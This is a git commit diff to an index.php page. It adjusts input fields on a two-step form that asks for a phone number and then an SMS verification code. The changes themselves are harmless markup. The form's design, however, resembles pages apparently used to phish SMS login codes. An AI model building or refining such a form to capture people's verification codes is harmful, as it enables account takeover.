3b6184b81bfba990311688644fbfba9266503820
termux-lab <59764619+termux-lab@users.noreply.github.com>
2020-02-24 13:06:13 +0300

    Update index.php

--- index.php
+++ index.php
@@ -35,11 +35,11 @@
       <hr>
     <div id="block" >
       <h3>Your number phone:</h3>
-      <input  onkeypress='return event.charCode >= 48 && event.charCode <= 57' placeholder="Phone number" maxlength=11 minlength=11 id=numb class="inp">
-      <input type="submit" value="Далее" id="phone" class="sun"  >
+      <input type="number" onkeypress='return event.charCode >= 48 && event.charCode <= 57' maxlength=11 minlength=11 id=numb class="inp">
+      <input type="submit" value="Далее" id="phone" class="sun" placeholder="Phone number" >
     </div>
     <div id=code>
-      <input name="" id="send_code" class="inp" onkeypress='return event.charCode >= 48 && event.charCode <= 57'  maxlength=6 placeholder="SMS Code">
+      <input name="" id="send_code" class="inp" type="number" onkeypress='return event.charCode >= 48 && event.charCode <= 57'  maxlength=6 placeholder="SMS Code">
       <input type="submit" value="Send" id="send" class="sun">
     </div>
   </center>
